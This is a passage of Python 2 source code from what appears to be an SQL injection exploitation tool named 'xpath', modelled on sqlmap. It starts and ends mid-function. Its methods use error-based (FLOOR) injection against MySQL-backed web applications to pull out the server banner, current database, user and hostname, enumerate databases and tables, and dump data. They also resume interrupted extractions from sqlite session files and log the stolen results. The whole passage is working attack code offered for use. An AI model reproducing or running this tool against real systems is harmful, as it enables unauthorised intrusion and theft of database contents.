									print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
									self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
								else:
									print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
									self._logs += "web server technology: %s\n" % (wsr)
								print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_name)

								
					if vul:
						# writing into the target.txt file (target, injection type)
						w = "%s (%s)" % (self._url, "POST")
						with open(str(self._PathPloads), "w") as fw:
							fw.write(str(w))
						fw.close()
						# flag check for basic or advance extraction 
						if flag == 'basic':
							#  extracts basics (version, database, user, host)
							self.XpathBasic(tgt, _tableSession, _colAlter, _name, Payloads)

						else:
							# extracts (dbs, tables, columns, dumps data from columns)
							_flag = False
							if Dbname and not TblName and not ColList:
								__dlist, __dumped = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads, Dbname=Dbname)
							elif Dbname and TblName and not ColList:
								__dlist, __dumped = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads, Dbname=Dbname, TblName=TblName)
							elif Dbname and TblName and ColList:
								__dlist, __dumped = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads, Dbname=Dbname, TblName=TblName, ColsList=ColList)
								print str(__dlist)
							else:
								__dlist, __dumped = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads)
							return __dlist, __dumped
						break

				except Exception as e:
					continue
	def Banner(self):

		# Table Session to check previous session using Version (Banner) Column
		_tableSession = self.tblSession
		_colVersion     = self.colVer

		#  Name to fetch for output
		_name    = "banner"

		#  flag setting
		_flag    = "basic"

		# Setting path to session.sqlite file
		if compat_exist(self._tgt):
			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses

		# Get data injection
		

		try:
			# Previous Session check
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)

		except Exception as e:

			 # if no previous Session then create it
			 # Payloads = BANNER (Version extracting payloads)
			 # Name     = _name (banner)
			 # flag 	= _flag (basic)
			try:
				self.XpathInject(_flag, _colVersion, _name, BANNER)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."

			

		else:
			try:
				# Table Session 1st row
				row = PrevSession[0] 
			except Exception as e:
				pass
			else:
				# If Exists data in Table Session
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]

				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'

				# Request for web app and web server response headers
				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)
				
				print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_name)
				try:
					# Previous Session Version check
					banner = sqlite.SessionPrev(self._PathSession, _tableSession, (_colVersion).replace(" TEXT", ""))[0][0]
				except Exception as e:

					# If not exist extract it again from target
					self.XpathBasic(_payload, _tableSession, _colVersion, _name, BANNER)

				else:

					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (banner)
					compat_sleep(0.5)
					print compat_color.fw + compat_color.sb + "back-end DBMS: MySQL >= 5.1"
					self._logs += "back-end DBMS: MySQL >= 5.1\n"
					print compat_color.fw + compat_color.sb + "banner: '%s'" % (banner)
					self._logs += "banner: %s\n\n" % (banner)
					with open(str(self._PathLogs), "a") as f:
						f.write(str(self._logs))
					f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""

		# elif self._url and self._data:
			# pass
	def Database(self):

		# Table Session to check previous session using Version (Banner) Column
		_tableSession = self.tblSession
		_colDatabase     = self.colCdb

		#  Name to fetch for output
		_name    = "current database"

		#  flag setting
		_flag    = "basic"

		# Setting path to session.sqlite file
		if compat_exist(self._tgt):
			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses

		# Get data injection
		

		try:
			# Previous Session check
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)

		except Exception as e:

			 # if no previous Session then create it
			 # Payloads = CURRENTDB (Version extracting payloads)
			 # Name     = _name (banner)
			 # flag 	= _flag (basic)
			try:
				self.XpathInject(_flag, _colDatabase, _name, CURRENTDB)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."


		else:
			try:
				# Table Session 1st row
				row = PrevSession[0] 
			except Exception as e:
				pass
			else:
				# If Exists data in Table Session
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]

				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'

				# Request for web app and web server response headers
				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)
				
				print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_name)

				try:
					# Previous Session Database check
					database = sqlite.SessionPrev(self._PathSession, _tableSession, (_colDatabase).replace(" TEXT", ""))[0][0]
				except Exception as e:

					# If not exist extract it again from target
					self.XpathBasic(_payload, _tableSession, _colDatabase, _name, CURRENTDB)

				else:

					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (database)
					compat_sleep(0.5)
					print compat_color.fw + compat_color.sb + "back-end DBMS: MySQL >= 5.1"
					self._logs += "back-end DBMS: MySQL >= 5.1\n"
					print compat_color.fw + compat_color.sb + "current database: '%s'" % (database)
					self._logs += "current database: %s\n\n" % (database)
					with open(str(self._PathLogs), "a") as f:
						f.write(str(self._logs))
					f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""
	def User(self):

		# Table Session to check previous session using Version (Banner) Column
		_tableSession = self.tblSession
		_colUser      = self.colUsr

		#  Name to fetch for output
		_name    = "current user"

		#  flag setting
		_flag    = "basic"

		# Setting path to session.sqlite file
		if compat_exist(self._tgt):
			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses

		# Get data injection
		

		try:
			# Previous Session check
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)

		except Exception as e:

			 # if no previous Session then create it
			 # Payloads = CURRENTUSER (User extracting payloads)
			 # Name     = _name (current user)
			 # flag 	= _flag (basic)
			try:
				self.XpathInject(_flag, _colUser, _name, CURRENTUSER)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."

			

		else:
			try:
				# Table Session 1st row
				row = PrevSession[0] 
			except Exception as e:
				pass
			else:
				# If Exists data in Table Session
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]

				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'

				# Request for web app and web server response headers
				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)
				
				print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_name)

				try:
					# Previous Session User check
					user = sqlite.SessionPrev(self._PathSession, _tableSession, (_colUser).replace(" TEXT", ""))[0][0]
				except Exception as e:

					# If not exist extract it again from target
					self.XpathBasic(_payload, _tableSession, _colUser, _name, CURRENTUSER)

				else:

					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (user)
					compat_sleep(0.5)
					print compat_color.fw + compat_color.sb + "back-end DBMS: MySQL >= 5.1"
					self._logs += "back-end DBMS: MySQL >= 5.1\n"
					print compat_color.fw + compat_color.sb + "current user: '%s'" % (user)
					self._logs += "current user: %s\n\n" % (user)
					with open(str(self._PathLogs), "a") as f:
						f.write(str(self._logs))
					f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""
	def Host(self):

		# Table Session to check previous session using Version (Banner) Column
		_tableSession = self.tblSession
		_colHost      = self.colHst

		#  Name to fetch for output
		_name    = "host name"

		#  flag setting
		_flag    = "basic"

		# Setting path to session.sqlite file
		if compat_exist(self._tgt):
			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses

		# Get data injection
		

		try:
			# Previous Session check
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)

		except Exception as e:

			 # if no previous Session then create it
			 # Payloads = HOSTNAMES (Hosts extracting payloads)
			 # Name     = _name (host)
			 # flag 	= _flag (basic)
			try:
				self.XpathInject(_flag, _colHost, _name, HOSTNAMES)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."

		else:
			try:
				# Table Session 1st row
				row = PrevSession[0] 
			except Exception as e:
				raise e
			else:
				# If Exists data in Table Session
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]

				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'

				# Request for web app and web server response headers
				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)
				
				print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_name)

				try:
					# Previous Session host check
					host = sqlite.SessionPrev(self._PathSession, _tableSession, (_colHost).replace(" TEXT", ""))[0][0]
				except Exception as e:

					# If not exist extract it again from target
					self.XpathBasic(_payload, _tableSession, _colHost, _name, HOSTNAMES)

				else:

					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (host)
					compat_sleep(0.5)
					print compat_color.fw + compat_color.sb + "back-end DBMS: MySQL >= 5.1"
					self._logs += "back-end DBMS: MySQL >= 5.1\n"
					print compat_color.fw + compat_color.sb + "host name: '%s'" % (host)
					self._logs += "host name: %s\n\n" % (host)
					with open(str(self._PathLogs), "a") as f:
						f.write(str(self._logs))
					f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""
	def Databases(self):

		_flag  			= "advance"
		_tableSession   = self.tblSession
		_tablePayload	= self.tblPayload
		_colList        = [self.colDbp, self.colDbc, self.colDbs]
		_nameList       = "database names"
		_listPayload    = [DB_COUNT, DB_NAMES]

		if compat_exist(self._tgt):
			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses

		

		try:
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)
		except (Exception, IOError) as e:


			# Injection if no previous Session found..
			try:
				__dlist, __dumped = self.XpathInject(_flag, _colList, _nameList, _listPayload)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."
			else:
				print compat_color.fg + compat_color.sb + "available databases [%s]:" % (__dumped)
				self._logs += "available databases [%s]:\n" % (__dumped)
				for dbs in __dlist:
					print compat_color.fg + compat_color.sb + "[*] %s" % (dbs)
					self._logs += "[*] %s\n" % (dbs)
		else:
			try:
				row = PrevSession[0] 
			except Exception as e:
				raise e
			else:
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]


				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'


				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)

				try:
					dbsCount = sqlite.SessionPrev(self._PathSession, _tableSession, (_colList[1]).replace(" TEXT", ""))[0][0]
				except Exception as e:


					# Injection if user interrupted while counting databases (failed to find previous session database count)
					_flag	= False
					__dlist, __dumped = self.XpathAdvance(_flag, _payload, _colList, Name=_nameList, Payloads=_listPayload)
					print compat_color.fg + compat_color.sb + "available databases [%s]:" % (__dumped)
					self._logs += "available databases [%s]:\n" % (__dumped)
					for dbs in __dlist:
						print compat_color.fg + compat_color.sb + "[*] %s" % (dbs)
						self._logs += "[*] %s\n" % (dbs)
				else:
					print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_nameList)
					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (dbsCount)
					try:
						dbs_names = (sqlite.SessionPrev(self._PathSession, _tableSession, (_colList[2]).replace(" TEXT", ""))[0][0]).split(",")
					except Exception as e:

						# Injection if user interrupted while started dumping database names (failed to find previous session for database names)
						_flag	= True
						_dlist, __ = self.XpathAdvance(_flag, _payload, _colList, Payloads=_listPayload, total=dbsCount)
						print compat_color.fg + compat_color.sb + "available databases [%s]:" % (dbsCount)
						self._logs += "available databases [%s]:\n" % (dbsCount)
						for dbs in _dlist:
							print compat_color.fg + compat_color.sb + "[*] %s" % (dbs)
							self._logs += "[*] %s\n" % (dbs)		
					else:
						for dbs in dbs_names:
							print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (dbs)

						if len(dbs_names) == int(dbsCount):
							print compat_color.fw + compat_color.sd + "available databases [%s]:" % (dbsCount)
							self._logs += "available databases [%s]:\n" % (dbsCount)
							for dbs in dbs_names:
								print compat_color.fw + compat_color.sd + "[*] %s" % (dbs)
								self._logs += "[*] %s\n" % (dbs)
						else:

							# Injection if user interrupted in between of dumping database names (resuming from previous session dumped database names)
							_init  = len(dbs_names)
							_total = int(dbsCount)
							try:
								_retVal = (sqlite.SessionPrev(self._PathSession, _tablePayload, (_colList[0]).replace(" TEXT", ""))[0][0])
							except Exception as e:
								raise e
							else:
								_ch = ','.join(map(str, dbs_names))
								_remaining, _, __dlist, __ = self.XpathDump(_init, _total, _retVal)
								_data = '"%s,%s"' % (_ch,_remaining)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colList[2]).replace(" TEXT",""), Data=_data)

								dbs_names.extend(__dlist)
								print compat_color.fg + compat_color.sb + "available databases [%s]:" % (_total)
								self._logs += "available databases [%s]:\n" % (_total)
								for dbs in dbs_names:
									print compat_color.fg + compat_color.sb + "[*] %s" % (dbs)
									self._logs += "[*] %s\n" % (dbs)
		with open(str(self._PathLogs), "a") as f:
			f.write(str(self._logs))
		f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""
	def Tables(self, Dbname=None):

		_flag  			= "advance"
		_tableSession   = self.tblSession
		_tablePayload	= self.tblPayload
		if Dbname:
			_dbName			= Dbname
			_Tblc			= "`%sCount` TEXT" % (Dbname)
			_Tbls 			= "`%sNames` TEXT" % (Dbname)
			_colList        = [self.colTbp, _Tblc, _Tbls]
			_nameList       = "tables for database: '%s'" % (_dbName)
			_listPayload    = [TBL_COUNT_FROM_DBS, TBL_DUMP_FROM_DBS]
		else:
			# Dump tables using default query (where table_Schema != information_Schema)
			pass 

		if compat_exist(self._tgt):
			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses

		

		try:
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)
		except (Exception, IOError) as e:

			try:
				__dlist, __ = self.XpathInject(_flag, _colList, _nameList, _listPayload, Dbname=_dbName)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."
			else:
				print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
				self._logs += "Database: %s\n" % (_dbName)
				print compat_color.fg + compat_color.sb + "[%s tables]:" % (len(__dlist))
				self._logs += "[%s tables]:\n" % (len(__dlist))
				_tables 			= compat_prettytable(["Tables"])
				_tables.align		= "l"
				_tables.header 	= False
				for tbl in __dlist:
					_tables.add_row([tbl])
				print compat_color.fg + compat_color.sb + "%s" % (_tables)
				self._logs += "%s\n" % (_tables)

		else:
			try:
				row = PrevSession[0] 
			except Exception as e:
				pass
			else:
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]


				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'


				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)


				try:
					tblsCount = sqlite.SessionPrev(self._PathSession, _tableSession, (_colList[1]).replace(" TEXT", ""))[0][0]
				except Exception as e:

					_flag		= False
					_dlist, __  = self.XpathAdvance(_flag, _payload, _colList, Name=_nameList, Payloads=_listPayload, Dbname=_dbName)
					print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
					self._logs += "Database: %s\n" % (_dbName)
					print compat_color.fg + compat_color.sb + "[%s tables]:" % (len(_dlist))
					self._logs += "[%s tables]:\n" % (len(_dlist))
					_tables 			= compat_prettytable(["Tables"])
					_tables.align		= "l"
					_tables.header 	= False
					for tbl in _dlist:
						_tables.add_row([tbl])
					print compat_color.fg + compat_color.sb + "%s" % (_tables)
					self._logs += "%s\n" % (_tables)


				else:
					print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_nameList)
					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (tblsCount)
					try:
						tbls_names = (sqlite.SessionPrev(self._PathSession, _tableSession, (_colList[2]).replace(" TEXT", ""))[0][0]).split(",")
					except Exception as e:

						_flag	= True
						_dlist, __ = self.XpathAdvance(_flag, _payload, _colList, Payloads=_listPayload, total=tblsCount, Dbname=_dbName)
						print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
						self._logs += "Database: %s\n" % (_dbName)
						print compat_color.fg + compat_color.sb + "[%s tables]:" % (len(_dlist))
						self._logs += "[%s tables]:\n" % (len(_dlist))
						_tables 			= compat_prettytable(["Tables"])
						_tables.align		= "l"
						_tables.header 	= False
						for tbl in _dlist:
							_tables.add_row([tbl])
						print compat_color.fg + compat_color.sb + "%s" % (_tables)
						self._logs += "%s\n" % (_tables)	

					else:
						if len(tbls_names) == int(tblsCount):

							print compat_color.fw + compat_color.sd + "Database: %s" % (_dbName)
							self._logs += "Database: %s\n" % (_dbName)
							print compat_color.fw + compat_color.sd + "[%s tables]:" % (tblsCount)
							self._logs += "[%s tables]:\n" % (tblsCount)
							_tables 			= compat_prettytable(["Tables"])
							_tables.align		= "l"
							_tables.header 	= False
							for tbl in tbls_names:
								_tables.add_row([tbl])
							print compat_color.fw + compat_color.sd + "%s" % (_tables)
							self._logs += "%s\n" % (_tables)

						else:
							_init  = len(tbls_names)
							_total = int(tblsCount)
							try:
								_retVal = (sqlite.SessionPrev(self._PathSession, _tablePayload, (_colList[0]).replace(" TEXT", ""))[0][0])
							except Exception as e:
								raise e
							else:
								for tbls in tbls_names:
									print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (tbls)
								_ch = ','.join(map(str, tbls_names))
								_remaining, _, __dlist, __ = self.XpathDump(_init, _total, _retVal)
								_data = '"%s,%s"' % (_ch,_remaining)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colList[2]).replace(" TEXT",""), Data=_data)
								tbls_names.extend(__dlist)
								print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
								self._logs += "Database: %s\n" % (_dbName)
								print compat_color.fg + compat_color.sb + "[%s tables]:" % (len(tbls_names))
								self._logs += "[%s tables]:\n" % (len(tbls_names))
								_tables 			= compat_prettytable(["Tables"])
								_tables.align		= "l"
								_tables.header 	= False
								for tbl in tbls_names:
									_tables.add_row([tbl])
								print compat_color.fg + compat_color.sb + "%s" % (_tables)
								self._logs += "%s\n" % (_tables)

		with open(str(self._PathLogs), "a") as f:
			f.write(str(self._logs))
		f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""
	def Columns(self, Dbname=None, TblName=None):

		_flag  			= "advance"
		_tableSession   = self.tblSession
		_tablePayload	= self.tblPayload
		if Dbname and TblName:
			_dbName			= Dbname
			_tblName		= TblName
			_Clc 			= "`%s_%sCount` TEXT" % (_dbName, _tblName)
			_Cls 			= "`%s_%sNames` TEXT" % (_dbName, _tblName)
			_colList        = [self.colClp, _Clc, _Cls]
			_nameList       = "columns for table '%s' in database '%s'" % (_tblName ,_dbName)
			_listPayload    = [COL_COUNT_FROM_TBL, COL_DUMP_FROM_TBL]
		else:
			# Dump tables using default query (where table_Schema != information_Schema)
			pass 

		if compat_exist(self._tgt):
